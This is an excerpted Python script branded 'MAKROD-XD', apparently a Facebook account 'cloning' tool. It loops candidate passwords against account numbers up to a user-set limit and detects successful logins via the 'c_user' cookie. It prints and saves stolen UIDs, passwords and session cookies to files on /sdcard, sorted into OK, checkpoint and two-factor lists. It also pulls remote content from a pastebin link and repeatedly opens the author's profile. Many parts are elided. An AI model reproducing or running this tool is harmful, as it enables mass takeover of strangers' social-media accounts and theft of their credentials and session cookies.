...
os.system('am start https://www.facebook.com/profile.php?id=100058912328617')
...
try:
    ...
    os.system('python MAKROD-XD .py')

    os.system("xdg-open https://www.facebook.com/profile.php?id=100058912328617")
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/JZNSciR9").text
...
oks = []
twf = []
os.system('xdg-open https://www.facebook.com/profile.php?id=100058912328617/?ref=share')
os.system('xdg-open https://www.facebook.com/profile.php?id=100058912328617/?ref=share')
...
def xyz():
    ...
    print('           \x1b[97m[\033[37;41m  M A K R O D - X D   \033[0;m] ')
    print(f"")
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m M A K R O D - X D   \033[0;m]")
    print(f"")
    linex()
    ...
    print(f"          \x1b[97m[\033[37;41m M A K R O D - X D   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 1000, 2000,4000, 5000,7000, 10000\n\n PUT CLONING LIMIT: '))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[M A K R O D - X D -OK🔥😁]--------------------[√]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/M A K R O D - X D -OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[M A K R O D - X D -CP😥💔]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/M A K R O D - X D -CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/M A K R O D - X D -2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[M A K R O D - X D  ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
